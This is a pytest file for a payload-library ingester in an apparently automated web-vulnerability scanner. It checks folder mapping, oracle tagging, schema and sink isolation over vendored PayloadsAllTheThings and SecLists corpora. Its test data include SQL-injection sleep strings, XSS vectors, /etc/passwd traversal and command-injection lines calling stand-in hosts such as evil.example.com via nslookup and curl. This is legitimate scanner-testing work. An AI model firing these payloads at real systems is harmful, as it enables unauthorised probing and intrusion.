"""Vendored-corpus ingest — folder-map + regex oracle-tagging (plan §9/§12; v1.6+).

Asserts the reconciled ingest DoD (all against the checked-in ``third_party/``
snapshot — no live tools, no network):

  1. Folder token → (vuln_class, inferred_sink_type) mapping is correct.
  2. Each ``_ORACLE_RULES`` pattern classifies a representative line the right way
     (timing / oob / execution / structural), and the folder default otherwise.
  3. An unmapped folder is skipped; a line mapping to an unknown edge is rejected
     (PayloadLibraryError) — Task 2 strictness preserved.
  4. Every ingested entry carries the full six-field schema with a ``source/relpath#Ln``
     locator ref; sink-isolation holds over the merged (base + corpus) library.
  5. The census is real and sizable (the vendored upstream lines actually ingested).

Corpora expand the payload SET only; every entry still routes through run_oracle
(its tagged ``oracle_type``), so a mis-tag can never become a false finding.
"""

from __future__ import annotations

from pathlib import Path

import pytest

from reachagent.graph.edges import FindingEdge, StructuralEdge
from reachagent.graph.nodes import SinkType
from reachagent.oracles import OracleMechanism
from reachagent.payloads import (
    PayloadLibrary,
    PayloadLibraryError,
    build_library,
    load_corpus_entries,
    load_corpus_report,
)
from reachagent.payloads.corpus import (
    _classify_oracle,
    _folder_class_for,
    _FolderClass,
    _is_acceptable_line,
)

_KNOWN_EDGES = {*(e.value for e in StructuralEdge), *(e.value for e in FindingEdge)}


# -- 1. folder token → (vuln_class, sink) mapping -----------------------------


@pytest.mark.parametrize(
    ("relpath", "vuln_class", "sink"),
    [
        ("Fuzzing/Databases/SQLi/quick-SQLi.txt", "sqli", SinkType.SQL),
        ("SQL Injection/Intruder/Auth_Bypass.txt", "sqli", SinkType.SQL),
        ("Fuzzing/Databases/SQLi/NoSQL.txt", "sqli", SinkType.SQL),  # SQLi token wins by path
        ("NoSQL Injection/Intruder/NoSQL.txt", "nosqli", SinkType.NOSQL),
        (
            "Fuzzing/XSS/robot-friendly/XSS-BruteLogic.txt",
            "xss_reflected",
            SinkType.HTML_REFLECTION,
        ),
        ("XSS Injection/Intruders/IntrudersXSS.txt", "xss_reflected", SinkType.HTML_REFLECTION),
        ("Command Injection/Intruder/command_exec.txt", "command_injection", SinkType.SHELL),
        ("Fuzzing/command-injection-commix.txt", "command_injection", SinkType.SHELL),
        ("Fuzzing/LFI/LFI-Jhaddix.txt", "path_traversal", SinkType.FILE_PATH),
        ("File Inclusion/Intruders/Traversal.txt", "path_traversal", SinkType.FILE_PATH),
        (
            "Directory Traversal/Intruder/directory_traversal.txt",
            "path_traversal",
            SinkType.FILE_PATH,
        ),
        (
            "Server Side Template Injection/Intruder/ssti.fuzz",
            "ssti",
            SinkType.TEMPLATE,
        ),
        ("LDAP Injection/Intruder/LDAP_FUZZ.txt", "ldap_injection", SinkType.LDAP),
    ],
)
def test_folder_token_maps_to_class_and_sink(relpath, vuln_class, sink) -> None:
    fc = _folder_class_for(Path(relpath))
    assert fc is not None
    assert fc.vuln_class == vuln_class
    assert fc.sink == sink


def test_unmapped_folder_is_skipped_not_guessed() -> None:
    # A folder no token maps → None (the loader skips + logs it, never guesses).
    assert _folder_class_for(Path("Fuzzing/Databases/OracleDB-SID.txt")) is None
    assert _folder_class_for(Path("Discovery/Web-Content/common.txt")) is None


def test_every_folder_default_edge_is_a_real_ss6_edge() -> None:
    # A folder default that isn't a real §6 edge would be a wiring bug — ingest
    # rejects it. Here assert the shipped map is clean.
    from reachagent.payloads.corpus import _FOLDER_MAP

    for fc in _FOLDER_MAP.values():
        assert fc.success_edge in _KNOWN_EDGES


# -- 2. oracle-tagging rules (each pattern classifies a representative line) ---


@pytest.mark.parametrize(
    ("line", "expected"),
    [
        ("' AND SLEEP(5)-- -", OracleMechanism.TIMING_STATISTICAL),
        ("'; WAITFOR DELAY '0:0:5'-- -", OracleMechanism.TIMING_STATISTICAL),
        ("' OR pg_sleep(5)-- -", OracleMechanism.TIMING_STATISTICAL),
        ("' AND BENCHMARK(5000000,MD5(1))-- -", OracleMechanism.TIMING_STATISTICAL),
        (";nslookup evil.example.com", OracleMechanism.OOB_CALLBACK),
        (";curl http://collab.example/x", OracleMechanism.OOB_CALLBACK),
        ("'; EXEC master..xp_dirtree '\\\\host\\poc'-- -", OracleMechanism.OOB_CALLBACK),
        ("<script>alert(1)</script>", OracleMechanism.EXECUTION_CONFIRMATION),
        ("<img src=x onerror=alert(1)>", OracleMechanism.EXECUTION_CONFIRMATION),
        ("{{7*7}}", OracleMechanism.EXECUTION_CONFIRMATION),
        ("../../../../etc/passwd", OracleMechanism.STRUCTURAL),
        ("..%2f..%2f..%2fetc/passwd", OracleMechanism.STRUCTURAL),
    ],
)
def test_oracle_rule_classifies_line(line, expected) -> None:
    # folder_default is deliberately a value NONE of the rules produce, so a hit is
    # attributable to the rule table, not the fallback.
    assert _classify_oracle(line, OracleMechanism.BUSINESS_RULE_INVARIANT) is expected


def test_oracle_rule_falls_back_to_folder_default() -> None:
    # A plain SQLi tautology matches no rule → the folder default (differential).
    assert _classify_oracle("' OR '1'='1", OracleMechanism.DIFFERENTIAL) is (
        OracleMechanism.DIFFERENTIAL
    )


def test_oracle_rule_first_match_wins() -> None:
    # A line that is both a sleep AND has a callback marker → timing (rule order:
    # timing precedes oob). Proves the ordered-first-match contract.
    line = "'; nslookup x.example; SELECT SLEEP(5)-- -"
    assert _classify_oracle(line, OracleMechanism.DIFFERENTIAL) is (
        OracleMechanism.TIMING_STATISTICAL
    )


# -- 3. un-mappable line / edge rejected (Task 2 strictness preserved) --------


def test_unknown_folder_edge_raises(tmp_path: Path) -> None:
    # A _FolderClass whose success_edge isn't a §6 edge is un-mappable → error.
    from reachagent.payloads.corpus import _entries_from_file

    bad = tmp_path / "x.txt"
    bad.write_text("' OR 1=1-- -\n", encoding="utf-8")
    fc = _FolderClass("sqli", SinkType.SQL, OracleMechanism.DIFFERENTIAL, "not_a_real_edge")
    with pytest.raises(PayloadLibraryError, match="not a §6 edge"):
        _entries_from_file("SecLists", bad, fc)


def test_unknown_source_name_raises() -> None:
    with pytest.raises(PayloadLibraryError, match="unknown corpus source"):
        load_corpus_entries(["NotACorpus"])


# -- per-sink acceptance predicate skips junk, keeps real payloads ------------


@pytest.mark.parametrize(
    ("line", "sink", "keep"),
    [
        ("", SinkType.SQL, False),
        ("# a comment", SinkType.SQL, False),
        ("' OR 1=1-- -", SinkType.SQL, True),
        ("<script>alert(1)</script>", SinkType.HTML_REFLECTION, True),
        ("just prose no markup", SinkType.HTML_REFLECTION, False),
        ("../../../../etc/passwd", SinkType.FILE_PATH, True),
        ("hello world", SinkType.FILE_PATH, False),
        (";nslookup x", SinkType.SHELL, True),
        ('{"$ne":null}', SinkType.NOSQL, True),
    ],
)
def test_per_sink_acceptance_predicate(line, sink, keep) -> None:
    assert _is_acceptable_line(line, sink) is keep


# -- 4. full schema + sink isolation over the merged library ------------------


def test_every_ingested_entry_carries_full_schema() -> None:
    for e in load_corpus_entries():
        assert e.vuln_class
        assert e.context
        assert isinstance(e.oracle_type, OracleMechanism)
        assert isinstance(e.inferred_sink_type, SinkType)
        assert "#L" in e.payload_ref  # a source/relpath#Ln line locator
        assert e.graph_edge_on_success in _KNOWN_EDGES


def test_merged_sink_isolation_sql_never_yields_html_and_vice_versa() -> None:
    lib = build_library()
    for entry in lib.get_payloads("sqli", SinkType.SQL):
        assert entry.inferred_sink_type is SinkType.SQL
    for entry in lib.get_payloads("xss_reflected", SinkType.HTML_REFLECTION):
        assert entry.inferred_sink_type is SinkType.HTML_REFLECTION
    # cross-sink query returns nothing (no leakage).
    assert lib.get_payloads("sqli", SinkType.HTML_REFLECTION) == []


def test_build_library_without_corpus_is_bare_slice() -> None:
    base = PayloadLibrary.from_file()
    assert len(build_library(include_corpus=False)) == len(base)


def test_build_library_merges_base_plus_corpus() -> None:
    base = PayloadLibrary.from_file()
    merged = build_library()
    corpus = load_corpus_entries()
    assert len(merged) == len(base) + len(corpus)


# -- 5. census is real + sizable (the vendored lines actually ingested) -------


def test_ingest_census_is_sizable_and_covers_all_classes() -> None:
    entries = load_corpus_entries()
    # The vendored snapshot ingests thousands of real upstream lines.
    assert len(entries) > 1000
    classes = {e.vuln_class for e in entries}
    assert {"sqli", "nosqli", "xss_reflected", "command_injection", "path_traversal"} <= classes


def test_named_source_selection_keeps_default_patt_only() -> None:
    patt = load_corpus_entries(["PayloadsAllTheThings"])
    seclists = load_corpus_entries(["SecLists"])
    default = load_corpus_entries()
    assert len(patt) > 0
    assert len(seclists) > 0
    assert default == patt


def test_ingest_report_keeps_rejections_out_of_fireable_entries() -> None:
    report = load_corpus_report()
    refs = {entry.payload_ref for entry in report.entries}
    assert report.semantic_invalid_refs
    assert set(report.semantic_invalid_refs).isdisjoint(refs)
    assert all(ref.startswith("PayloadsAllTheThings/") for ref in refs)
    assert report.reserved_files
    assert any("XXE Injection" in path for path in report.reserved_files)
    assert all(entry.oracle_type in set(OracleMechanism) for entry in report.entries)
    assert load_corpus_report().semantic_invalid_refs == report.semantic_invalid_refs


def test_ingest_report_counts_match_entries() -> None:
    report = load_corpus_report()
    assert sum(report.counts.values()) == len(report.entries)
    assert {entry.vuln_class for entry in report.entries} >= {
        "sqli",
        "nosqli",
        "xss_reflected",
        "command_injection",
        "path_traversal",
        "ssti",
        "ldap_injection",
    }


def test_ingest_is_deterministic() -> None:
    first = [e.payload_ref for e in load_corpus_entries()]
    second = [e.payload_ref for e in load_corpus_entries()]
    assert first == second
